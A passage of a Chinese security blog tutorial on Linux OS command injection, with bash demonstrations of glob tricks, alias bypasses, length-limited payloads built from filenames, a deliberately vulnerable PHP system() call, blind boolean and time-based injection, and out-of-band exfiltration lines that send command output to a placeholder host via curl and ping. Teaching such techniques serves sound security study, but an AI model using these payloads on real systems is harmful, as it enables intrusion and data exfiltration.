class="hljs-attribute">bash</span>-<span class="hljs-number">3</span>.<span class="hljs-number">2</span>$ *  # 此时等价于 rm zookeeper.sh<br></code></pre></td></tr></table></figure></li>
+<li>那么所以需要注意的是，必须考虑命令的参数问题：<br />
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 无干扰，利用成功：</span><br><span class="hljs-attribute">bash</span>-<span class="hljs-number">3</span>.<span class="hljs-number">2</span>$ touch zookeeper.sh<br><span class="hljs-attribute">bash</span>-<span class="hljs-number">3</span>.<span class="hljs-number">2</span>$ touch dir<br><span class="hljs-attribute">bash</span>-<span class="hljs-number">3</span>.<span class="hljs-number">2</span>$ *<br><span class="hljs-attribute">zookeeper</span>.sh<br><br><span class="hljs-comment"># 存在干扰，利用失败：</span><br><span class="hljs-attribute">bash</span>-<span class="hljs-number">3</span>.<span class="hljs-number">2</span>$ touch zookeeper.sh<br><span class="hljs-attribute">bash</span>-<span class="hljs-number">3</span>.<span class="hljs-number">2</span>$ touch whoami<br><span class="hljs-attribute">bash</span>-<span class="hljs-number">3</span>.<span class="hljs-number">2</span>$ *<br><span class="hljs-attribute">whoami</span>: extra operand ‘zookeeper.sh’<br><span class="hljs-attribute">Try</span> &#x27;whoami --help&#x27; for more information.<br></code></pre></td></tr></table></figure><br />
+这个我暂时也没什么好办法绕过参数的干扰。它实际上是相当于 <code>'whoami' 'zookeeper.sh'</code> 的，所以这种情况下，就算我们创建了一个叫 <code>whoami &amp;&amp;</code> 的文件，<code>*</code> 也是没用的，因为不管是命令还是参数，都已经被 <code>'</code> 包住了。如果确实存在干扰，那么可以考虑在利用之前，将目录完全清空：<code>rm -rf ./*</code>，比较凶残，尽量不要使用。<br />
+如果目录是空的，那么我们就可以利用 <code>*</code> 了：<br />
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">bash</span>-<span class="hljs-number">3</span>.<span class="hljs-number">2</span>$ ls<br><span class="hljs-attribute">bash</span>-<span class="hljs-number">3</span>.<span class="hljs-number">2</span>$ &gt;ping<br><span class="hljs-attribute">bash</span>-<span class="hljs-number">3</span>.<span class="hljs-number">2</span>$ &gt;tr0y.wang<br><span class="hljs-attribute">bash</span>-<span class="hljs-number">3</span>.<span class="hljs-number">2</span>$ *<br><span class="hljs-attribute">PING</span> tr0y.wang (<span class="hljs-number">104.21.65.233</span>): <span class="hljs-number">56</span> data bytes<br><span class="hljs-attribute">64</span> bytes from <span class="hljs-number">104.21.65.233</span>: icmp_seq=<span class="hljs-number">0</span> ttl=<span class="hljs-number">52</span> time=<span class="hljs-number">179</span>.<span class="hljs-number">297</span> ms<br><span class="hljs-attribute">64</span> bytes from <span class="hljs-number">104.21.65.233</span>: icmp_seq=<span class="hljs-number">1</span> ttl=<span class="hljs-number">52</span> time=<span class="hljs-number">178</span>.<span class="hljs-number">529</span> ms<br></code></pre></td></tr></table></figure><br />
+最后，单个 <code>*</code> 与大于两个的 <code>*</code> 是一样的，至于为什么是大于两个，因为 <code>**</code> 比较特殊，继续往下看。</li>
+</ol></li>
+<li>利用 <code>**</code><br />
+bash 的 <code>**</code>，可以用 <code>shopt -s/-u globstar</code> 修改其特性，<code>off</code> 的时候，<code>**</code> 等于 <code>*</code>，<code>on</code> 的时候，则是递归通配符：<br />
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@macr0phag3 <span class="hljs-built_in">test</span>]# <span class="hljs-built_in">shopt</span> -u globstar  <span class="hljs-comment"># 关闭</span><br>[root@macr0phag3 <span class="hljs-built_in">test</span>]# <span class="hljs-built_in">echo</span> **<br>a b<br>[root@macr0phag3 <span class="hljs-built_in">test</span>]# <span class="hljs-built_in">shopt</span> -s globstar  <span class="hljs-comment"># 开启</span><br>[root@macr0phag3 <span class="hljs-built_in">test</span>]# <span class="hljs-built_in">echo</span> **<br>a a/a1 a/a2 a/a3 b b/b1 b/b2 b/b3<br></code></pre></td></tr></table></figure><br />
+需要注意的是，这个功能是大于 bash4 的版本才有的。<br />
+最后，上面提到，单个 <code>*</code> 与大于两个的 <code>*</code> 是一样的，证明如下:<br />
+<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@macr0phag3</span> test]<span class="hljs-meta"># shopt -s globstar</span><br>[root<span class="hljs-symbol">@macr0phag3</span> test]<span class="hljs-meta"># mkdir -p a/a1</span><br>[root<span class="hljs-symbol">@macr0phag3</span> test]<span class="hljs-meta"># echo *</span><br>a <span class="hljs-built_in">ping</span><br>[root<span class="hljs-symbol">@macr0phag3</span> test]<span class="hljs-meta"># echo **  # 只有它特殊</span><br>a a/a1 <span class="hljs-built_in">ping</span><br>[root<span class="hljs-symbol">@macr0phag3</span> test]<span class="hljs-meta"># echo ***</span><br>a <span class="hljs-built_in">ping</span><br>[root<span class="hljs-symbol">@macr0phag3</span> test]<span class="hljs-meta"># echo ****</span><br>a <span class="hljs-built_in">ping</span><br>[root<span class="hljs-symbol">@macr0phag3</span> test]<span class="hljs-meta"># echo *****</span><br>a <span class="hljs-built_in">ping</span><br></code></pre></td></tr></table></figure><br />
+由于这个特性默认是 <code>off</code> 的，所以用的也比较少。</li>
+<li>利用其他 glob<br />
+glob 是一种特殊的模式匹配，最常见的是通配符拓展。例如 <code>?</code>、<code>[a-z]</code>、<code>[[:space:]]</code> 等等。</li>
+</ul>
+<h3 id="覆盖指令">覆盖指令</h3>
+<p>利用 alias 或者自定义函数来覆盖关键的系统命令，比如在 .zshrc 中设置：<br />
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">alias</span> <span class="hljs-built_in">ls</span>=<span class="hljs-string">&quot;echo &#x27;not allowed&#x27;&quot;</span><br><br><span class="hljs-function"><span class="hljs-title">cat</span></span>()&#123;<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;not allowed&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure></p>
+<p>上面提到过，开头的 <code>\</code> 可以用于忽略 alias，即执行 <code>ls</code> 就是执行 <code>echo "not allowed"</code>，但是执行 <code>\ls</code> 就是真的执行了 <code>ls</code>。</p>
+<p>对于自定义的函数来说，利用 <code>command</code> 开头即可忽略自定义的函数，如 <code>command cat</code>。</p>
+<p>完整示例<br />
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">» <span class="hljs-built_in">ls</span><br>not allowed<br><br>» \<span class="hljs-built_in">ls</span><br>key<br><br>» <span class="hljs-built_in">cat</span> key<br>not allowed<br><br>» <span class="hljs-built_in">command</span> <span class="hljs-built_in">cat</span> key<br>Macr0phag3<br></code></pre></td></tr></table></figure></p>
+<h3 id="无回显">无回显</h3>
+<p>不是在所有的情况下都能直接拿到输出。</p>
+<p>这里的 <code>your_own_ip</code> 是你自己搭建的外带数据接收服务器，懒得搭建的话，使用 nc 监听一下端口也行。实在想临时用用的话可以使用知道创宇的，<a target="_blank" rel="noopener" href="http://ceye.io/">传送门🚪</a></p>
+<ul>
+<li>http 外带<br />
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">curl your_own_ip.com/<span class="hljs-string">`whoami`</span><br></code></pre></td></tr></table></figure><br />
+<img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/OS命令注入指北/20190513080742020.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></li>
+<li>ICMP 外带<br />
+<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">ping -c <span class="hljs-number">1</span> `whoami`.your_own_ip.com<br></code></pre></td></tr></table></figure><br />
+<img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/OS命令注入指北/20190513080757207.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></li>
+</ul>
+<p>注意，命令执行的结果中，常常会有空格等等特殊字符，这个时候使用 base64 编码即可：<br />
+<code>curl your_own_ip.com/$(whoami|base64)</code>，结果：<br />
+<img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/OS命令注入指北/20190513081112123.png!blog" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<h3 id="长度">长度</h3>
+<p>在命令注入中往往会存在注入命令的长度过短的情况，无法将全部命令完全的输入进去，这种情况下就需要我们来想办法突破系统命令长度的限制。</p>
+<p>思路是：</p>
+<ol type="1">
+<li>将命令拆开，通过创建文件，以文件名的形式放到目录下</li>
+<li>执行 ls，将目录里的文件名存到一个文件中</li>
+<li>利用 <code>. filename</code> 或者 <code>sh filename</code>运行这个文件，执行命令。</li>
+</ol>
+<p>以执行<code>whoami</code>为例：<br />
+<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs livescript">[root@macr0phag3 fortest]<span class="hljs-comment"># ls</span><br>[root@macr0phag3 fortest]<span class="hljs-comment"># &gt;i\\</span><br>[root@macr0phag3 fortest]<span class="hljs-comment"># &gt;m\\</span><br>[root@macr0phag3 fortest]<span class="hljs-comment"># &gt;a\\</span><br>[root@macr0phag3 fortest]<span class="hljs-comment"># &gt;o\\</span><br>[root@macr0phag3 fortest]<span class="hljs-comment"># &gt;h\\</span><br>[root@macr0phag3 fortest]<span class="hljs-comment"># &gt;w\\</span><br>[root@macr0phag3 fortest]<span class="hljs-comment"># ls -t</span><br>w<span class="hljs-string">\</span>  h<span class="hljs-string">\</span>  o<span class="hljs-string">\</span>  a<span class="hljs-string">\</span>  m<span class="hljs-string">\</span>  i<span class="hljs-string">\</span><br>[root@macr0phag3 fortest]<span class="hljs-comment"># ls -t&gt;c</span><br>[root@macr0phag3 fortest]<span class="hljs-comment"># . c</span><br>bash: c: 未找到命令<br>root<br></code></pre></td></tr></table></figure></p>
+<p>这波操作很秀，但是有些问题需要解释一下：<br />
+&gt; 假如这个目录下本来就存在一些文件、目录，会对这个方法造成影响吗？</p>
+<p>不会。原因是下面利用的是 <code>ls -t</code>来获取目录的文件/文件夹，<code>-t</code>代表按照时间排序，所以可以保证我们创建的文件是排在一起的，这样拼起来才是一个正确的命令。</p>
+<blockquote>
+<p>创建文件为何要按照命令的倒序？</p>
+</blockquote>
+<p>和第一个问题一样，倒序保证<code>ls -t</code>后正序</p>
+<blockquote>
+<p><code>&gt;w\\</code> 是什么意思？</p>
+</blockquote>
+<p>这个的原型是 <code>cmd &gt; file</code>，但是 cmd 是可省的，甚至随意一个命令都可以用于创建文件：<br />
+<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@macr0phag3</span> fortest]<span class="hljs-meta"># anything &gt; test</span><br>bash: anything: 未找到命令<br>[root<span class="hljs-symbol">@macr0phag3</span> fortest]<span class="hljs-meta"># ls</span><br>test<br></code></pre></td></tr></table></figure></p>
+<p>可以看到，虽然报错了，但是 <code>test</code> 还是创建成功了。所以这样写的时候，文件会优先被创建。</p>
+<p>那为什么需要加个 <code>\\</code> 呢，因为其实是需要让文件名带有 <code>\</code>，而之所以要转义是 shell 的原因，如果从 PHP 传入，只需要 <code>&gt;i\</code>即可。也就是这样利用的 payload 长度最长仅为 <code>7</code>：<br />
+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">http:</span>//<span class="hljs-number">192.168</span><span class="hljs-number">.26</span><span class="hljs-number">.177</span>/index.php?cmd=&gt;u.com    <span class="hljs-meta"># 长度 6</span><br><span class="hljs-symbol">http:</span>//<span class="hljs-number">192.168</span><span class="hljs-number">.26</span><span class="hljs-number">.177</span>/index.php?cmd=&gt;baid\    <span class="hljs-meta"># 长度 6</span><br><span class="hljs-symbol">http:</span>//<span class="hljs-number">192.168</span><span class="hljs-number">.26</span><span class="hljs-number">.177</span>/index.php?cmd=&gt;<span class="hljs-string">&#x27; &#x27;</span>\     <span class="hljs-meta"># 长度 5</span><br><span class="hljs-symbol">http:</span>//<span class="hljs-number">192.168</span><span class="hljs-number">.26</span><span class="hljs-number">.177</span>/index.php?cmd=&gt;<span class="hljs-built_in">ping</span>\    <span class="hljs-meta"># 长度 6</span><br><span class="hljs-symbol">http:</span>//<span class="hljs-number">192.168</span><span class="hljs-number">.26</span><span class="hljs-number">.177</span>/index.php?path=ls -t&gt;c  <span class="hljs-meta"># 长度 7</span><br><span class="hljs-symbol">http:</span>//<span class="hljs-number">192.168</span><span class="hljs-number">.26</span><span class="hljs-number">.177</span>/index.php?path=sh c     <span class="hljs-meta"># 长度 4</span><br></code></pre></td></tr></table></figure></p>
+<blockquote>
+<p><code>. c</code>是什么意思？结果为什么是这样？</p>
+</blockquote>
+<p>Linux 中，<code>.</code>也叫<code>period</code>，它的作用和<code>source</code>一样，就是用当前的 shell 执行一个文件中的命令。比如，当前运行的 shell 是 bash，则 <code>. filename</code>的意思就是用 bash 执行 filename 文件中的命令。注意，<strong>用<code>. file</code>执行文件，是不需要 file 有 x 权限的</strong>。所以，c 里面的内容就被当做代码执行了。但是需要注意，<code>sh</code>是没法这样运行的，如果 <code>www-data</code>的 shell 是 <code>sh</code> 的话，就只能使用<code>sh filename</code>运行。</p>
+<p>那 <code>bash: c: 未找到命令</code> 是怎么来的呢？是在 <code>ls -t&gt;c</code>的时候创建的。由结果我们也可以知道，这样执行，有报错是不影响下一个命令执行的。</p>
+<p>其实还有更短 payload 下的命令执行，不过我觉得相当不实用，因为目录下一般都会有其他文件，<code>ls</code> 的结果默认按照字母顺序排列，payload 会被隔开或者有干扰。</p>
+<p>所以也就 CTF 会用了：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/87203">传送门🚪</a></li>
+<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/Hm6TiLHiAygrJr-MGRq9Mw">传送门🚪</a></li>
+</ul>
+<h2 id="类型">类型</h2>
+<ul>
+<li>常规注入</li>
+<li>盲注
+<ul>
+<li>基于时间</li>
+<li>基于布尔</li>
+</ul></li>
+<li>OOB</li>
+</ul>
+<h3 id="常规注入">常规注入</h3>
+<p>利用命令分隔符来插入额外的命令。</p>
+<p>例如：<br />
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;path&#x27;</span>];<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls $cmd&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></p>
+<p>利用方式有很多。由于 bash 的命令分隔符为<code>;</code>，所以可以利用分号来执行多个语句：<br />
+payload：<br />
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">path</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;; whoami&quot;</span><br></code></pre></td></tr></table></figure><br />
+由于命令分隔符有很多种，所以 payload 也会有很多。</p>
+<h3 id="基于布尔盲注">基于布尔盲注</h3>
+<p>只会返回命令执行成功/失败。</p>
+<p>利用方式如下：<br />
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">l$</span><span class="language-bash">(<span class="hljs-built_in">whoami</span> | <span class="hljs-built_in">cut</span> -c 1 | <span class="hljs-built_in">tr</span> a s)</span><br><span class="hljs-meta prompt_">l$</span><span class="language-bash">(<span class="hljs-built_in">whoami</span> | <span class="hljs-built_in">cut</span> -c 1 | <span class="hljs-built_in">tr</span> b s)</span><br>...<br><span class="hljs-meta prompt_">l$</span><span class="language-bash">(<span class="hljs-built_in">whoami</span> | <span class="hljs-built_in">cut</span> -c 1 | <span class="hljs-built_in">tr</span> r s)</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">命令执行成功，说明第一个字符为 r</span><br></code></pre></td></tr></table></figure></p>
+<p>原理就是利用<code>cut</code>提取结果的每一个字符，然后利用 <code>tr</code> 猜解，猜解的方式为将指定的字符替换成 <code>s</code>，如果与 cut 提取的字符一致，那么结果 tr 的结果就是<code>ls</code>，执行成功。否则 tr 的结果就不是 <code>s</code>，则最终执行的结果会出现报错：<code>bash: la: 未找到命令</code>。</p>
+<h3 id="基于时间盲注">基于时间盲注</h3>
+<p>利用 <code>sleep seconds</code> 来获取结果。原理就是利用<code>cut</code>提取结果的每一个字符，然后利用 <code>tr</code> 猜解，猜解的方式为将指定的字符替换成数字，如果与 cut 提取的字符一致，那么结果 tr 的结果就是数字，sleep 就会产生时延，否则 tr 的结果是字符，sleep 不会有时延。</p>
+<ol type="1">
+<li>第一轮<br />
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sleep</span> $(<span class="hljs-built_in">whoami</span> | <span class="hljs-built_in">cut</span> -c 1 | <span class="hljs-built_in">tr</span> a 1)<br>...<br><span class="hljs-built_in">sleep</span> $(<span class="hljs-built_in">whoami</span> | <span class="hljs-built_in">cut</span> -c 1 | <span class="hljs-built_in">tr</span> r 1) <span class="hljs-comment"># 延时 1s, 说明第一个字符是 r</span><br></code></pre></td></tr></table></figure></li>
+<li>第二轮<br />
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sleep</span> $(<span class="hljs-built_in">whoami</span> | <span class="hljs-built_in">cut</span> -c 2 | <span class="hljs-built_in">tr</span> a 1)<br>...<br><span class="hljs-built_in">sleep</span> $(<span class="hljs-built_in">whoami</span> | <span class="hljs-built_in">cut</span> -c 2 | <span class="hljs-built_in">tr</span> o 1) <span class="hljs-comment"># 延时 1s, 说明第二个字符是 o</span><br></code></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="oob">OOB</h3>
+<p>OOB 可以看做是在无回显的情况下的 OS 注入，利用无回显中的技术即可。</p>
+<br>
+<p style="text-align: center;">
+<font size="2px" color="gray">来呀快活呀</font><br />
+<img src="https://clean-1252075454.cos.ap-nanjing.myqcloud.com/20200528120800990.png" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload style="zoom:30%" />
+</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/" class="category-chain-item">经验总结</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Linux/">#Linux</a>
+      
+        <a href="/tags/Web/">#Web</a>
+      
+        <a href="/tags/%E6%B3%A8%E5%85%A5/">#注入</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Linux OS 命令注入指北</div>
+      <div>https://www.tr0y.wang/2019/05/13/OS命令注入指北/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Tr0y</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2019年5月13日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2023年12月14日</div>
+        </div>
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2019/05/24/Nmap-guide/" title="Nmap 使用手册">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Nmap 使用手册</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2019/05/13/OWASP-Top10-%E7%B3%BB%E5%88%97%E4%B9%8BOS%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/" title="OWASP Top10 系列之 OS 命令注入">
+                        <span class="hidden-mobile">OWASP Top10 系列之 OS 命令注入</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  <article id="comments" lazyload>
+    
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      var light = 'github-light';
+      var dark = 'github-dark';
+      var schema = document.documentElement.getAttribute('data-user-color-scheme');
+      if (schema === 'dark') {
+        schema = dark;
+      } else {
+        schema = light;
+      }
+      window.UtterancesThemeLight = light;
+      window.UtterancesThemeDark = dark;
+      var s = document.createElement('script');
+      s.setAttribute('src', 'https://utteranc.es/client.js');
+      s.setAttribute('repo', 'Macr0phag3/Macr0phag3.github.io');
+      s.setAttribute('issue-term', 'title');
+      
+      s.setAttribute('label', 'comment');
+      
+      s.setAttribute('theme', schema);
+      s.setAttribute('crossorigin', 'anonymous');
+      document.getElementById('comments').appendChild(s);
+    })
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+  </article>
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":true,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  
+      <script>
+        if (!window.MathJax) {
+          window.MathJax = {
+            tex    : {
+              inlineMath: { '[+]': [['$', '$']] }
+            },
+            loader : {
+              load: ['ui/lazy']
+            },
+            options: {
+              renderActions: {
+                insertedScript: [200, () => {
+                  document.querySelectorAll('mjx-container').forEach(node => {
+                    let target = node.parentNode;
